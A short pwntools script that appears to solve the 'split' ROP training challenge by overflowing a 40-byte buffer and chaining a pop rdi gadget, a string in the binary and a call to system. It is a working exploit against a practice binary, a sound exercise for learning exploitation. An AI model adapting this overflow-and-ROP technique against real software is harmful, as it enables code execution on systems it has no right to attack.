from pwn import *

elf = context.binary = ELF("./split")

r = process()

POP_RDI = p64(0x00000000004007c3)

BINCAT = p64(elf.sym["usefulString"])

SYSTEM = p64(0x0040074b)

RET = p64(0x000000000040053e)

#gdb.attach(r)

payload = b"A"*40 + POP_RDI + BINCAT + SYSTEM

r.clean()
r.sendline(payload)

r.interactive() 